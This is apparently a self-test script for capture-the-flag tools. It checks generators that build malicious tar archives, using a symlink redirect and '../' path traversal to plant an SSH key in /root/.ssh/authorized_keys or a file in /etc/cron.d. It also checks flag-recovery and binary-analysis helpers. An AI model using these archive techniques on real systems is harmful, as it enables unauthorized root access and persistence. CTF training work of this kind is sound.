#!/usr/bin/env python3
"""Self-test for the CTFTTOU-068..072 tarpit tools (CTFTTE-PWN-009/010,
FOR-030, CRY-014, REV-010). Run: python tools/scripts/test_tarpit_tools.py"""
import os
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent
PY = sys.executable
failures = []


def run(script, *args, cwd=None):
    return subprocess.run([PY, str(SCRIPTS / script), *args],
                          capture_output=True, text=True, cwd=cwd)


def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + (f" :: {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
    os.chdir(td)

    # --- CTFTTOU-068 tar-symlink-redirect.py -------------------------------
    Path("key.pub").write_text("ssh-ed25519 AAAAtest123 ctft\n", newline="\n")
    r = run("tar-symlink-redirect.py", "--target", "/root/.ssh",
            "--payload-file", "key.pub", "--dry-run")
    check("068 dry-run exits 0", r.returncode == 0, r.stderr)
    check("068 dry-run prints ln -s", "ln -s /root/.ssh extracted" in r.stdout, r.stdout)

    r = run("tar-symlink-redirect.py", "--target", "/root/.ssh",
            "--payload-file", "key.pub", "--output", "evil.tar", "--no-link")
    check("068 archive build exits 0", r.returncode == 0, r.stderr)
    with tarfile.open("evil.tar") as tf:
        names = tf.getnames()
        data = tf.extractfile("authorized_keys").read()
    check("068 tar has authorized_keys entry", names == ["authorized_keys"], str(names))
    check("068 payload bytes preserved", data == b"ssh-ed25519 AAAAtest123 ctft\n")

    # --- CTFTTOU-069 tar-parent-traversal.py ------------------------------
    r = run("tar-parent-traversal.py", "--target", "/root/.ssh/authorized_keys",
            "--payload-file", "key.pub", "--verify")
    check("069 verify escapes", "escape: yes" in r.stdout, r.stdout + r.stderr)
    check("069 verify lands on target",
          "file would land at: /root/.ssh/authorized_keys" in r.stdout, r.stdout)

    r = run("tar-parent-traversal.py", "--target", "/etc/cron.d/pwn",
            "--payload-file", "key.pub", "--prefix", "../".join([""] * 4),
            "--output", "trav.tar")
    check("069 archive build exits 0", r.returncode == 0, r.stderr)
    with tarfile.open("trav.tar") as tf:
        names = tf.getnames()
        kinds = [m.isdir() for m in tf.getmembers()]
    check("069 sibling pair present",
          len(names) == 2 and kinds == [True, False], str(list(zip(names, kinds))))
    check("069 entries carry traversal prefix", all(n.startswith("../../../") for n in names),
          str(names))

    # --- CTFTTOU-070 mutating-file-watchdog.py -----------------------------
    Path("stable.txt").write_text("no guardian here\n")
    r = run("mutating-file-watchdog.py", "stable.txt", "--reads", "3")
    check("070 stable file detected", r.returncode == 0 and "STABLE" in r.stdout,
          r.stdout + r.stderr)

    # --- CTFTTOU-071 mtime-xor-recover.py ----------------------------------
    epoch = 1760704344
    key = str(epoch).encode()
    flag = b"HF-a811fd355bc1d401c2a74c3726a9a6f8"
    ct = bytes(a ^ b for a, b in zip(flag, key * (len(flag) // len(key) + 1)))
    Path("flag.txt").write_text(ct.hex())
    os.utime("flag.txt", (epoch, epoch))
    r = run("mtime-xor-recover.py", "--file", "flag.txt")
    check("071 recovers flag from mtime", flag.decode() in r.stdout and "FLAG-LIKE" in r.stdout,
          r.stdout + r.stderr)

    r = run("mtime-xor-recover.py", "--file", "flag.txt", "--mtime", str(epoch + 7),
            "--window", "10")
    check("071 window sweep recovers flag", flag.decode() in r.stdout,
          r.stdout + r.stderr)

    # --- CTFTTOU-072 gosym2src.py -------------------------------------------
    fake = (b"main.main\n\x00github.com/franciscolkdo/guntar/cmd.Execute\x00"
            b"github.com/franciscolkdo/guntar/internal/tree\x00"
            b"github.com/spf13/cobra.Command.Execute\x00")
    Path("fakebin").write_bytes(fake)
    r = run("gosym2src.py", "fakebin", "--verbose")
    check("072 finds repo root", "https://github.com/franciscolkdo/guntar" in r.stdout,
          r.stdout + r.stderr)
    check("072 lists package paths", "cmd.Execute" in r.stdout and "internal/tree" in r.stdout,
          r.stdout)
    check("072 finds cobra repo", "https://github.com/spf13/cobra" in r.stdout, r.stdout)

print()
if failures:
    print(f"{len(failures)} FAILURES: {failures}")
    sys.exit(1)
print("all tool self-tests passed")
